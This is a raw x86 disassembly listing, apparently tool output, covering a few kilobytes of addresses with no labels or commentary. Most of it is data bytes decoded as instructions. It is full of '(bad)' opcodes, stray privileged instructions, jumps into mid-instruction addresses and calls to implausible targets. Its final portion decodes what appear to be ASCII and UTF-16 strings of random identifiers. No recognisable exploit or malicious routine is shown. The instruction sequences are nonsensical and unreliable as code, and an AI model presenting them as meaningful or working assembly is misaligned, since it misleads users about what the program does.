  429f67:	add    BYTE PTR [ebp-0x75],cl
  429f6a:	mov    esi,eax
  429f6c:	xor    eax,DWORD PTR [eax]
  429f6e:	mov    al,bh
  429f70:	or     eax,0x487284
  429f75:	xor    al,cl
  429f77:	mov    ecx,DWORD PTR [ebp-0x4]
  429f7a:	mov    ecx,edi
  429f7c:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  429f82:	jb     0x429f93
  429f84:	add    BYTE PTR [edi],dh
  429f86:	enter  0x8500,0x8b
  429f8a:	add    ah,bl
  429f8c:	add    BYTE PTR [eax],al
  429f8e:	inc    ebp
  429f8f:	(bad)  
  429f90:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  429f97:	mov    esi,DWORD PTR [edx-0x4]
  429f9a:	add    bh,cl
  429f9c:	dec    ebp
  429f9d:	mov    dh,0x8b
  429f9f:	add    esi,DWORD PTR [ebx]
  429fa1:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  429fa7:	add    BYTE PTR [eax],al
  429fa9:	mov    eax,ecx
  429fab:	loopne 0x429ffa
  429fad:	add    BYTE PTR [ebx-0x757bcc39],cl
  429fb3:	dec    eax
  429fb4:	or     eax,0x8b7232
  429fb9:	in     al,0xc1
  429fbb:	or     DWORD PTR [ebp-0x31],ecx
  429fbe:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  429fc5:	xor    dh,BYTE PTR [edx-0x75]
  429fc8:	add    al,dh
  429fca:	enter  0x4f09,0xcf
  429fce:	inc    ebp
  429fcf:	mov    WORD PTR [ebx-0x75cdccb8],cs
  429fd5:	or     al,BYTE PTR ds:0xe4728b
  429fdb:	or     DWORD PTR [ebp-0x31],ecx
  429fde:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  429fe5:	cmp    dh,BYTE PTR [edx+0xf]
  429fe8:	add    bl,dl
  429fea:	rol    DWORD PTR [eax],0x4d
  429fed:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  429ff3:	(bad)  
  429ff4:	or     eax,0x487284
  429ff9:	xor    al,cl
  429ffb:	mov    ecx,DWORD PTR [ebp-0x20]
  429ffe:	mov    ecx,DWORD PTR [ecx]
  42a000:	xor    ecx,edi
  42a002:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a009:	xor    cl,al
  42a00b:	mov    ecx,DWORD PTR [edi]
  42a00d:	fadd   QWORD PTR [ebp+0x9]
  42a010:	call   0xffcf9ae4
  42a015:	dec    eax
  42a016:	dec    ebp
  42a017:	xor    bh,BYTE PTR [ebx]
  42a019:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a01d:	loopne 0x42a01b
  42a01f:	or     edi,eax
  42a021:	iret   
  42a022:	ret    
  42a023:	mov    WORD PTR [ebp+0x4c],es
  42a026:	mov    esi,DWORD PTR [edx]
  42a028:	call   0x84526767
  42a02d:	(bad)  
  42a02e:	cwde   
  42a02f:	add    BYTE PTR [edx],dh
  42a031:	mov    esi,DWORD PTR [ebx]
  42a033:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a039:	test   BYTE PTR [ebx],dh
  42a03b:	dec    eax
  42a03c:	add    esi,DWORD PTR [edx]
  42a03e:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a044:	dec    edi
  42a046:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a04d:	xor    al,BYTE PTR [ebx]
  42a04f:	mov    edi,DWORD PTR [ebx]
  42a051:	in     al,0x75
  42a053:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a059:	dec    eax
  42a05a:	xor    esi,DWORD PTR [edx]
  42a05c:	lea    ecx,[edx]
  42a05e:	or     BYTE PTR [ebx+0x900f072],cl
  42a064:	ja     0x42a035
  42a066:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a06d:	cmp    ch,al
  42a06f:	jne    0x42a064
  42a071:	mov    edi,edi
  42a073:	fadd   QWORD PTR [ebp+0x0]
  42a076:	mov    eax,edi
  42a078:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a07f:	mov    edx,DWORD PTR [ebx]
  42a081:	in     al,0x45
  42a083:	or     DWORD PTR [ebx],esi
  42a085:	iret   
  42a086:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a08d:	xor    dl,BYTE PTR [eax-0x75]
  42a090:	sbb    al,ah
  42a092:	dec    DWORD PTR [ecx]
  42a094:	mov    ecx,edi
  42a096:	in     al,dx
  42a097:	mov    eax,es
  42a099:	dec    eax
  42a09a:	mov    DWORD PTR [edx],esi
  42a09c:	fmul   QWORD PTR [edx]
  42a09e:	jne    0x42a02b
  42a0a0:	(bad)  
  42a0a1:	(bad)  
  42a0a3:	or     DWORD PTR [ebp-0x31],eax
  42a0a6:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a0ad:	cmp    bh,bh
  42a0af:	jne    0x42a0f6
  42a0b1:	lea    ecx,[ebx-0x38372750]
  42a0b7:	inc    ebx
  42a0b9:	mov    eax,ecx
  42a0bb:	mov    eax,0xa00c111
  42a0c0:	jne    0x42a107
  42a0c2:	mov    esi,DWORD PTR [ebx]
  42a0c4:	test   al,0x3
  42a0c6:	inc    ebp
  42a0c7:	mov    DWORD PTR [eax-0xc],edx
  42a0ca:	fiadd  WORD PTR [ebp-0x1]
  42a0cd:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a0d3:	jb     0x42a0d6
  42a0d5:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a0db:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a0e1:	retf   
  42a0e2:	mov    edx,ecx
  42a0e4:	adc    al,0x84
  42a0e6:	(bad)  
  42a0e7:	std    
  42a0e8:	ret    
  42a0e9:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a0ef:	hlt    
  42a0f0:	rol    edi,0x82
  42a0f3:	ret    
  42a0f4:	cld    
  42a0f5:	enter  0x11ff,0x45
  42a0f9:	inc    ebp
  42a0fa:	pop    edi
  42a0fb:	mov    ebx,DWORD PTR [ebx+0x14]
  42a0fe:	ret    0xc7
  42a101:	test   BYTE PTR [ebx+0x45325198],cl
  42a107:	jmp    0x42a094
  42a109:	push   0x8
  42a10b:	call   DWORD PTR [esi]
  42a10d:	in     al,dx
  42a10e:	add    BYTE PTR [ebp+0x1],0x50
  42a112:	add    bl,ah
  42a114:	add    bh,bh
  42a116:	icebp  
  42a117:	mov    ecx,DWORD PTR [eax]
  42a119:	cld    
  42a11a:	pop    es
  42a11b:	dec    ebp
  42a11c:	shl    DWORD PTR [ebx],0x72
  42a11f:	add    eax,DWORD PTR [eax]
  42a121:	cmp    edx,ecx
  42a123:	je     0x42a135
  42a125:	mov    esi,DWORD PTR [ebp-0x4]
  42a128:	inc    edi
  42a12a:	or     al,0xc3
  42a12c:	jmp    FWORD PTR [edx-0x18]
  42a12f:	(bad)  
  42a130:	sti    
  42a131:	cwde   
  42a132:	(bad)  
  42a133:	call   0xffa09a3e
  42a138:	or     al,0x45
  42a13a:	push   ebp
  42a13b:	sub    esp,0x18
  42a13e:	push   ebx
  42a13f:	inc    ebp
  42a140:	mov    edi,edi
  42a142:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a149:	test   al,0x50
  42a14b:	inc    ebp
  42a14c:	push   ecx
  42a14d:	push   eax
  42a14e:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a154:	add    ah,bh
  42a156:	(bad)  
  42a157:	dec    ebp
  42a158:	add    DWORD PTR [ebx],esi
  42a15a:	inc    ebp
  42a15b:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a161:	push   0xffffff8b
  42a163:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a169:	add    eax,DWORD PTR [ecx]
  42a16b:	or     BYTE PTR [eax],al
  42a16d:	call   0xff849972
  42a172:	mov    eax,DWORD PTR [ebp+0x14]
  42a175:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a17b:	inc    ebp
  42a17c:	dec    ecx
  42a17d:	add    ebp,DWORD PTR [edx+0x14]
  42a180:	push   0x8b3045
  42a185:	call   0x33aceefa
  42a18a:	inc    DWORD PTR [ebx]
  42a18c:	mov    DWORD PTR [edi],ecx
  42a18e:	mov    eax,ecx
  42a190:	or     BYTE PTR [ebp-0x3d],cl
  42a193:	cmp    eax,edi
  42a195:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a19a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a1a0:	adc    al,0xc9
  42a1a2:	inc    ebp
  42a1a3:	adc    BYTE PTR [eax+0x55],dl
  42a1a6:	jne    0x42a194
  42a1a8:	call   0xff53a138
  42a1ad:	dec    ebp
  42a1ae:	inc    ebp
  42a1af:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a1b5:	add    BYTE PTR [ebx],bh
  42a1b7:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a1bb:	push   eax
  42a1bc:	or     al,0x51
  42a1be:	dec    ebp
  42a1bf:	xor    DWORD PTR [ebx],0xf320398
  42a1c5:	cmp    eax,DWORD PTR [ebp+0x74]
  42a1c8:	mov    edi,edi
  42a1ca:	pop    edi
  42a1cb:	adc    BYTE PTR [ebx+0x75],bl
  42a1ce:	ret    0x50
  42a1d1:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a1d5:	(bad)  
  42a1d6:	clc    
  42a1d7:	mov    esp,ebp
  42a1d9:	pop    ecx
  42a1da:	mov    ecx,0xf80085c2
  42a1df:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a1e2:	push   esi
  42a1e3:	push   esi
  42a1e4:	(bad)  
  42a1e5:	lock add DWORD PTR [ebp+0x44],eax
  42a1e9:	mov    edx,DWORD PTR [eax]
  42a1eb:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a1ef:	or     BYTE PTR [eax+0x7],dl
  42a1f2:	push   ecx
  42a1f3:	ret    
  42a1f4:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a1fa:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a200:	or     al,0x80
  42a202:	jge    0x42a205
  42a204:	mov    DWORD PTR [eax],eax
  42a206:	and    al,0x8
  42a208:	cmp    DWORD PTR [ebp+0x10],eax
  42a20b:	mov    edx,DWORD PTR [esi]
  42a20d:	xchg   esp,eax
  42a20e:	dec    esp
  42a20f:	add    BYTE PTR [eax],dl
  42a211:	mov    ecx,edx
  42a213:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a217:	dec    ebp
  42a218:	into   
  42a219:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a21f:	mov    edx,DWORD PTR [eax+0x14]
  42a222:	das    
  42a223:	add    al,0x45
  42a225:	add    BYTE PTR [ebp+0x0],dh
  42a228:	mov    edi,edi
  42a22a:	and    al,0x50
  42a22c:	mov    eax,DWORD PTR [eax]
  42a22e:	and    al,0xd1
  42a230:	xor    eax,DWORD PTR [esi]
  42a232:	lea    eax,[ebp+0x8]
  42a235:	xor    esi,DWORD PTR [edx+0x3]
  42a238:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a23e:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a244:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a24e:	cmp    edi,edi
  42a250:	pushf  
  42a251:	mov    edi,edi
  42a253:	or     BYTE PTR [esi+ecx*1],cl
  42a256:	jne    0x42a21b
  42a258:	call   0xba224
  42a25d:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a261:	mov    ebx,DWORD PTR [eax]
  42a263:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a267:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a26f:	pop    esi
  42a270:	dec    ecx
  42a272:	and    al,0x10
  42a274:	call   DWORD PTR [ebp+0x24]
  42a277:	in     al,dx
  42a278:	call   0xffc6a161
  42a27d:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a281:	pushf  
  42a282:	pop    esi
  42a283:	mov    ebp,esp
  42a285:	and    al,0xc2
  42a287:	push   edi
  42a288:	add    BYTE PTR [ecx+0x3a],al
  42a28b:	mov    DWORD PTR [ebp+0x24],esi
  42a28e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a294:	dec    DWORD PTR [eax]
  42a296:	and    al,0x7
  42a298:	(bad)  
  42a299:	cli    
  42a29a:	and    al,0x98
  42a29c:	or     BYTE PTR [edx],dh
  42a29e:	sbb    BYTE PTR [ebx],al
  42a2a0:	adc    al,0x89
  42a2a2:	jmp    DWORD PTR [esp]
  42a2a5:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a2ab:	adc    al,0x8
  42a2ad:	dec    ebp
  42a2ae:	adc    BYTE PTR [ebp-0x7c],dh
  42a2b1:	mov    esi,DWORD PTR [edx]
  42a2b3:	and    al,0x24
  42a2b5:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a2bb:	add    edi,eax
  42a2bd:	pcmpeqb mm1,mm2
  42a2c0:	jmp    0x42a30e
  42a2c2:	dec    DWORD PTR [eax]
  42a2c4:	je     0x42a2b1
  42a2c6:	mov    edi,DWORD PTR [ecx]
  42a2c8:	pop    ebp
  42a2c9:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a2cd:	cwde   
  42a2ce:	mov    DWORD PTR [eax-0x8],ebp
  42a2d1:	jge    0x42a33b
  42a2d3:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a2d9:	push   ecx
  42a2da:	push   edi
  42a2db:	adc    BYTE PTR [eax],al
  42a2dd:	hlt    
  42a2de:	sub    al,0x10
  42a2e0:	add    ch,dl
  42a2e2:	adc    BYTE PTR es:[eax],al
  42a2e5:	adc    BYTE PTR ds:0xe860010,0x10
  42a2ec:	add    BYTE PTR [ecx-0x72ffeffa],dl
  42a2f2:	push   ds
  42a2f3:	adc    BYTE PTR [eax],al
  42a2f5:	repnz sbb DWORD PTR [eax],edx
  42a2f8:	add    BYTE PTR [eax+0x3001052],ch
  42a2fe:	or     DWORD PTR [eax],edx
  42a300:	add    ch,ch
  42a302:	pusha  
  42a303:	adc    BYTE PTR [eax],al
  42a305:	fldenv [edx-0x5d22ffbe]
  42a30b:	inc    edx
  42a30c:	add    cl,ah
  42a30e:	mov    ds:0xa2e50042,al
  42a313:	inc    edx
  42a314:	add    cl,ch
  42a316:	mov    ds:0xa2ed0042,al
  42a31b:	inc    edx
  42a31c:	add    cl,dh
  42a31e:	mov    ds:0xa2f50042,al
  42a323:	inc    edx
  42a324:	add    cl,bh
  42a326:	mov    ds:0xa2fd0042,al
  42a32b:	inc    edx
  42a32c:	add    BYTE PTR [ecx],al
  42a32e:	mov    ds:0x6a10042,eax
  42a333:	adc    BYTE PTR [eax],al
  42a335:	sbb    BYTE PTR [edx],al
  42a337:	adc    BYTE PTR [eax],al
  42a339:	js     0x42a3b0
  42a33b:	adc    BYTE PTR [eax],al
  42a33d:	jns    0x42a358
  42a33f:	adc    BYTE PTR [eax],al
  42a341:	les    esp,FWORD PTR [eax+edx*1+0x0]
  42a345:	jmp    0x104e:0x95001007
  42a34c:	add    BYTE PTR [ebx+0x3100106c],ch
  42a352:	mov    ds:0xa3350042,eax
  42a357:	inc    edx
  42a358:	add    BYTE PTR [ecx],bh
  42a35a:	mov    ds:0xa33d0042,eax
  42a35f:	inc    edx
  42a360:	add    BYTE PTR [ecx-0x5d],al
  42a363:	inc    edx
  42a364:	add    BYTE PTR [ebp-0x5d],al
  42a367:	inc    edx
  42a368:	add    BYTE PTR [ecx-0x5d],cl
  42a36b:	inc    edx
  42a36c:	add    BYTE PTR [ebp-0x5d],cl
  42a36f:	inc    edx
  42a370:	add    BYTE PTR [ebx],al
  42a372:	add    DWORD PTR [eax],edx
  42a374:	add    BYTE PTR [esi],ch
  42a376:	jg     0x42a388
  42a378:	add    BYTE PTR [eax+ebp*2],cl
  42a37b:	adc    BYTE PTR [eax],al
  42a37d:	lds    edi,FWORD PTR [eax+0x10]
  42a380:	add    BYTE PTR [edi+0x44],cl
  42a383:	adc    BYTE PTR [eax],al
  42a385:	xchg   BYTE PTR [ecx],cl
  42a387:	adc    BYTE PTR [eax],al
  42a389:	(bad)  
  42a38a:	pop    ds
  42a38b:	adc    BYTE PTR [eax],al
  42a38d:	xlat   BYTE PTR ds:[ebx]
  42a38e:	push   esp
  42a38f:	adc    BYTE PTR [eax],al
  42a391:	jno    0x42a336
  42a393:	inc    edx
  42a394:	add    BYTE PTR [ebp-0x5d],dh
  42a397:	inc    edx
  42a398:	add    BYTE PTR [ecx-0x5d],bh
  42a39b:	inc    edx
  42a39c:	add    BYTE PTR [ebp-0x5d],bh
  42a39f:	inc    edx
  42a3a0:	add    BYTE PTR [ecx-0x7affbd5d],al
  42a3a6:	mov    ds:0xa3890042,eax
  42a3ab:	inc    edx
  42a3ac:	add    BYTE PTR [ebp-0x73ffbd5d],cl
  42a3b2:	ja     0x42a3c4
  42a3b4:	add    BYTE PTR [ecx+0x6800104f],dl
  42a3ba:	sbb    DWORD PTR [eax],edx
  42a3bc:	add    BYTE PTR [ebx-0x74ffefbf],bl
  42a3c2:	add    eax,0x5b120010
  42a3c7:	adc    BYTE PTR [eax],al
  42a3c9:	scas   al,BYTE PTR es:[edi]
  42a3ca:	xor    DWORD PTR [eax],edx
  42a3cc:	add    BYTE PTR [edi-0x4effefca],dh
  42a3d2:	mov    ds:0xa3b50042,eax
  42a3d7:	inc    edx
  42a3d8:	add    BYTE PTR [ecx-0x42ffbd5d],bh
  42a3de:	mov    ds:0xa3c10042,eax
  42a3e3:	inc    edx
  42a3e4:	add    ch,al
  42a3e6:	mov    ds:0xa3c90042,eax
  42a3eb:	inc    edx
  42a3ec:	add    ch,cl
  42a3ee:	mov    ds:0x2f060042,eax
  42a3f3:	adc    BYTE PTR [eax],al
  42a3f5:	fs push edi
  42a3f7:	adc    BYTE PTR [eax],al
  42a3f9:	lods   al,BYTE PTR ds:[esi]
  42a3fa:	inc    ebp
  42a3fb:	adc    BYTE PTR [eax],al
  42a3fd:	pop    ds
  42a3fe:	push   es
  42a3ff:	adc    BYTE PTR [eax],al
  42a401:	xchg   ebp,eax
  42a402:	push   ds
  42a403:	adc    BYTE PTR [eax],al
  42a405:	mov    bh,0x14
  42a407:	adc    BYTE PTR [eax],al
  42a409:	repz dec esp
  42a40b:	adc    BYTE PTR [eax],al
  42a40d:	enter  0x1008,0x0
  42a411:	icebp  
  42a412:	mov    ds:0xa3f50042,eax
  42a417:	inc    edx
  42a418:	add    cl,bh
  42a41a:	mov    ds:0xa3fd0042,eax
  42a41f:	inc    edx
  42a420:	add    BYTE PTR [ecx],al
  42a422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a423:	inc    edx
  42a424:	add    BYTE PTR ds:0x90042a4,al
  42a42a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a42b:	inc    edx
  42a42c:	add    BYTE PTR ds:0x550042a4,cl
  42a432:	xor    BYTE PTR [edx+0x39],cl
  42a435:	pop    edi
  42a436:	push   ecx
  42a437:	cmp    BYTE PTR [edx+0x38],bl
  42a43a:	push   edx
  42a43b:	add    BYTE PTR [ebp+0x59],cl
  42a43e:	inc    ebx
  42a43f:	cmp    DWORD PTR [edi+0x46],ebx
  42a442:	inc    ebp
  42a443:	xor    eax,0x5958535f
  42a448:	add    BYTE PTR [esi+0x30],dl
  42a44b:	push   esi
  42a44c:	xor    DWORD PTR [edi+0x33],ebx
  42a44f:	dec    esp
  42a450:	push   ebx
  42a451:	push   ebx
  42a452:	xor    esi,DWORD PTR ds:0x59003135
  42a458:	push   eax
  42a459:	inc    ebp
  42a45a:	xor    dh,BYTE PTR [edi]
  42a45c:	pop    edi
  42a45d:	xor    DWORD PTR [ebx+0x45],eax
  42a460:	add    BYTE PTR [eax+0x30],bl
  42a463:	dec    edi
  42a464:	pop    edi
  42a465:	push   eax
  42a466:	xor    BYTE PTR [ebx],dh
  42a468:	pop    ecx
  42a469:	xor    eax,0x57585f
  42a46e:	push   edi
  42a46f:	dec    ebx
  42a470:	aaa    
  42a471:	cmp    DWORD PTR [edi+0x50],ebx
  42a474:	dec    ecx
  42a475:	push   edi
  42a476:	pop    edi
  42a477:	cmp    DWORD PTR [edx],esi
  42a479:	dec    esp
  42a47a:	add    BYTE PTR [edi+0x54],cl
  42a47d:	xor    ebx,DWORD PTR [edi+0x43]
  42a480:	pop    eax
  42a481:	inc    edx
  42a482:	xor    BYTE PTR [edi+0x32],bl
  42a485:	aaa    
  42a486:	cmp    BYTE PTR [eax],dh
  42a488:	dec    esp
  42a489:	add    BYTE PTR [edx+0x32],al
  42a48c:	inc    ecx
  42a48d:	pop    edi
  42a48e:	pop    ecx
  42a48f:	inc    ebx
  42a490:	xor    eax,0x32335f37
  42a495:	inc    esp
  42a496:	add    BYTE PTR [esi+0x4b],cl
  42a499:	xor    eax,0x5158565f
  42a49e:	xor    al,0x5f
  42a4a0:	dec    ecx
  42a4a1:	inc    edx
  42a4a2:	aaa    
  42a4a3:	aaa    
  42a4a4:	add    BYTE PTR [ecx+0x41],cl
  42a4a7:	aaa    
  42a4a8:	pop    edi
  42a4a9:	push   edx
  42a4aa:	pop    ecx
  42a4ab:	xor    edx,DWORD PTR [edx+0x48]
  42a4ae:	pop    edi
  42a4af:	inc    ebp
  42a4b0:	dec    esp
  42a4b1:	dec    ecx
  42a4b2:	inc    ecx
  42a4b3:	add    BYTE PTR ss:[edx+0x34],dl
  42a4b7:	dec    ebx
  42a4b8:	aaa    
  42a4b9:	pop    edi
  42a4ba:	inc    ecx
  42a4bb:	dec    edx
  42a4bc:	inc    esp
  42a4bd:	pop    edi
  42a4be:	xor    BYTE PTR [esi],dh
  42a4c0:	pop    eax
  42a4c1:	inc    edi
  42a4c2:	xor    DWORD PTR [ebx+0x0],ecx
  42a4c5:	dec    edi
  42a4c6:	xor    DWORD PTR ss:[ecx],esi
  42a4c9:	pop    edi
  42a4ca:	xor    eax,0x304e4f58
  42a4cf:	cmp    DWORD PTR [esi+0x0],eax
  42a4d2:	dec    esp
  42a4d3:	dec    edx
  42a4d4:	cmp    BYTE PTR [edi+0x36],bl
  42a4d7:	xor    BYTE PTR [edi+0x36],dl
  42a4da:	cmp    BYTE PTR [eax],al
  42a4dc:	pop    edx
  42a4dd:	xor    al,BYTE PTR [edx+0x5f]
  42a4e0:	push   esp
  42a4e1:	pop    edx
  42a4e2:	xor    eax,0x4b003955
  42a4e7:	cmp    DWORD PTR [ecx+0x5f],ebx
  42a4ea:	cmp    BYTE PTR [ecx],dh
  42a4ec:	push   edi
  42a4ed:	inc    ecx
  42a4ee:	pop    edi
  42a4ef:	push   edi
  42a4f0:	dec    esp
  42a4f1:	ss pop edi
  42a4f3:	dec    ecx
  42a4f4:	inc    esp
  42a4f5:	add    BYTE PTR [edx+0x56],al
  42a4f8:	xor    DWORD PTR [edi+0x43],ebx
  42a4fb:	push   eax
  42a4fc:	inc    esi
  42a4fd:	inc    ebp
  42a4fe:	pop    edi
  42a4ff:	push   esi
  42a500:	add    BYTE PTR [ebx+eax*2+0x53],dl
  42a504:	pop    edi
  42a505:	xor    cl,BYTE PTR [esi+0x33]
  42a508:	pop    edi
  42a509:	push   esi
  42a50a:	add    BYTE PTR [esi+0x43],al
  42a50d:	xor    BYTE PTR [edi],dh
  42a50f:	pop    edi
  42a510:	push   edx
  42a511:	dec    esp
  42a512:	pop    ecx
  42a513:	pop    edi
  42a514:	inc    edi
  42a515:	dec    ebx
  42a516:	inc    ebp
  42a517:	add    BYTE PTR [ebp+0x31],al
  42a51a:	aaa    
  42a51b:	pop    edi
  42a51c:	push   ebp
  42a51d:	push   edx
  42a51e:	dec    ebx
  42a51f:	aaa    
  42a520:	pop    edi
  42a521:	xor    dl,BYTE PTR [edx+0x0]
  42a524:	push   edx
  42a525:	xor    DWORD PTR [edi+0x32],edx
  42a528:	xor    al,0x5f
  42a52a:	inc    ebx
  42a52b:	inc    ecx
  42a52c:	push   edi
  42a52d:	dec    edx
  42a52e:	pop    edi
  42a52f:	push   esi
  42a530:	dec    esp
  42a531:	inc    esi
  42a532:	add    BYTE PTR [ebp+0x45],al
  42a535:	push   ebp
  42a536:	pop    edi
  42a537:	dec    edi
  42a538:	dec    esp
  42a539:	aaa    
  42a53a:	pop    edi
  42a53b:	dec    esi
  42a53c:	add    BYTE PTR ss:[edi+0x44],cl
  42a540:	pop    ecx
  42a541:	pop    edi
  42a542:	dec    ebp
  42a543:	inc    edx
  42a544:	pop    ecx
  42a545:	push   esi
  42a546:	add    BYTE PTR [edx+0x36],al
  42a549:	ss pop edi
  42a54b:	aaa    
  42a54c:	inc    esp
  42a54d:	xor    DWORD PTR [eax+0x50],edx
  42a550:	xor    eax,0x494a5200
  42a555:	pop    edi
  42a556:	dec    eax
  42a557:	push   ebp
  42a558:	xor    BYTE PTR [edi+0x30],bl
  42a55b:	add    BYTE PTR [ecx+0x4d],bl
  42a55e:	pop    eax
  42a55f:	pop    edi
  42a560:	push   eax
  42a561:	inc    esp
  42a562:	dec    ebp
  42a563:	aaa    
  42a564:	inc    edi
  42a565:	pop    edi
  42a566:	push   ecx
  42a567:	push   ebx
  42a568:	add    BYTE PTR [ecx+0x0],dl
  42a56b:	dec    edi
  42a56c:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42a570:	add    BYTE PTR [ecx+0x0],bl
  42a573:	xor    BYTE PTR [eax],al
  42a575:	push   ebx
  42a576:	add    BYTE PTR [edi],dh
  42a578:	add    BYTE PTR [ebp+0x0],dl
  42a57b:	add    BYTE PTR [eax],al
  42a57d:	inc    ecx
  42a57e:	add    BYTE PTR [esi+0x0],cl
  42a581:	push   ebp
  42a582:	add    BYTE PTR [edx],dh
  42a584:	add    BYTE PTR [edi+0x0],bl
  42a587:	inc    edi
  42a588:	add    BYTE PTR [eax+eax*1],dh
  42a58b:	dec    ebp
  42a58c:	add    BYTE PTR [eax],dh
  42a58e:	add    BYTE PTR [edi+0x0],bl
  42a591:	inc    esi
  42a592:	add    BYTE PTR [esi],dh
  42a594:	add    BYTE PTR [eax],al
  42a596:	add    BYTE PTR [ebx+0x0],al
  42a599:	dec    ecx
  42a59a:	add    BYTE PTR [eax],dh
  42a59c:	add    BYTE PTR [edi+0x0],bl
  42a59f:	push   ecx
  42a5a0:	add    BYTE PTR [edx+0x0],dl
  42a5a3:	add    BYTE PTR ss:[ebx+0x0],dl
  42a5a7:	pop    edi
  42a5a8:	add    BYTE PTR [eax+eax*1+0x4c],al
  42a5ac:	add    BYTE PTR [eax+eax*1+0x50],cl
  42a5b0:	add    BYTE PTR [eax],al
  42a5b2:	add    BYTE PTR [edx+0x0],bl
  42a5b5:	xor    BYTE PTR [eax],al
  42a5b7:	add    BYTE PTR ss:[edi+0x0],bl
  42a5bb:	dec    esp
  42a5bc:	add    BYTE PTR [ebx+0x0],dl
  42a5bf:	dec    ebx
  42a5c0:	add    BYTE PTR [ebx+0x0],dl
  42a5c3:	add    BYTE PTR [eax],al
  42a5c5:	dec    edx
  42a5c6:	add    BYTE PTR [ebx],dh
  42a5c8:	add    BYTE PTR [ecx],dh
  42a5ca:	add    BYTE PTR ds:0x5f003500,dh
  42a5d0:	add    BYTE PTR [esi+0x0],dl
  42a5d3:	push   ebx
  42a5d4:	add    BYTE PTR [eax+0x0],bl
  42a5d7:	add    BYTE PTR [eax],al
  42a5d9:	inc    esp
  42a5da:	add    BYTE PTR [ecx+0x0],al
  42a5dd:	inc    ebx
  42a5de:	add    BYTE PTR ds:0x5f003600,dh
  42a5e4:	add    BYTE PTR [ebx+0x0],al
  42a5e7:	xor    eax,0x36003700
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	add    BYTE PTR [eax+eax*1+0x54],cl
  42a5f2:	add    BYTE PTR [eax],dh
  42a5f4:	add    BYTE PTR [ebx],dh
  42a5f6:	add    BYTE PTR [eax+eax*1],dh
  42a5f9:	pop    edi
  42a5fa:	add    BYTE PTR [eax],dh
  42a5fc:	add    BYTE PTR [eax+0x0],cl
  42a5ff:	xor    eax,0x3000
  42a604:	add    BYTE PTR [edx+0x0],cl
  42a607:	push   ecx
  42a608:	add    BYTE PTR [eax+eax*1+0x5f],al
  42a60c:	add    BYTE PTR [ebx],dh
  42a60e:	add    BYTE PTR [ecx],dh
  42a610:	add    BYTE PTR [esi+0x0],al
  42a613:	cmp    BYTE PTR [eax],al
  42a615:	pop    edi
  42a616:	add    BYTE PTR [ecx],bh
  42a618:	add    BYTE PTR [esi+0x0],dl
  42a61b:	xor    BYTE PTR [eax],al
  42a61d:	push   ecx
  42a61e:	add    BYTE PTR [esi],dh
  42a620:	add    BYTE PTR [eax],al
  42a622:	add    BYTE PTR [ecx+0x0],dl
  42a625:	push   esi
  42a626:	add    BYTE PTR [edi+0x0],cl
  42a629:	xor    al,0x0
  42a62b:	pop    edi
  42a62c:	add    BYTE PTR [eax+eax*1+0x52],cl
  42a630:	add    BYTE PTR [eax+0x0],bl
  42a633:	add    BYTE PTR [eax],al
  42a635:	dec    ecx
  42a636:	add    BYTE PTR [ebp+0x0],cl
  42a639:	push   ebx
  42a63a:	add    BYTE PTR [edi+0x0],bl
  42a63d:	add    BYTE PTR ss:[edi+0x0],al
  42a641:	add    BYTE PTR ss:[eax+eax*1],dh
  42a645:	push   edi
  42a646:	add    BYTE PTR [eax],al
  42a648:	add    BYTE PTR [edi+0x0],al
  42a64b:	xor    DWORD PTR [eax],eax
  42a64d:	dec    ebp
  42a64e:	add    BYTE PTR [edi+0x0],bl
  42a651:	inc    ecx
  42a652:	add    BYTE PTR [ebx+0x0],cl
  42a655:	dec    ecx
